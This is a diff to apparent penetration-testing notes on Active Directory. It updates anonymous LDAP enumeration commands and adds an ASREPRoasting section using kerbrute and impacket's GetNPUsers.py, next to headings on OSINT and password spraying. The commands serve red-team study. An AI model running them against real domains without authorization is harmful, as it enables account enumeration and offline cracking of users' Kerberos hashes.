@@ -30,10 +30,11 @@ such as a complete listing of users, groups, computers, user account attributes,
 
  ```shell
  # using ldapsearch, we need to provide proper filter for getting usernames
- ldapsearch -h $DC_IP -x -b "DC=$DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+ ldapsearch -H ldap://$DC_IP -x -b "DC=$DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
 
  # using windapsearch, it is easier as we dont need filter
  windapsearch.py --dc-ip $DC_IP -u "" -U
+ windapsearch.py --dc-ip $DC_IP -d $DOMAIN --custom "objectClass=*"
  ```
 
 - Do some OSINT and try to get information related to people of the target company.
@@ -95,7 +96,7 @@ This count is maintained separate on each DC in case of multiple DCs.
 - LDAP Anonymous Bind from Linux:
 
  ```shell
- ldapsearch -h $DC_IP -x -b "DC=<$DOMAIN>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+ ldapsearch -H ldap://$DC_IP -x -b "DC=<$DOMAIN>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
  ```
 
 - LDAP Anonymous Bind from Windows:
@@ -113,6 +114,17 @@ This count is maintained separate on each DC in case of multiple DCs.
 
 - If you have tried other methods and dont have foothold, you may ask the client to
 provide password policy.
+
+
+## ASREPRoasting
+
+```shell
+# Using kerbrute
+kerbrute userenum -d $DOMAIN --dc $DC_IP valid_users_list 
+
+# Using impacket toolkit
+GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile valid_ad_users 
+```
 
 
 ## Password Spraying
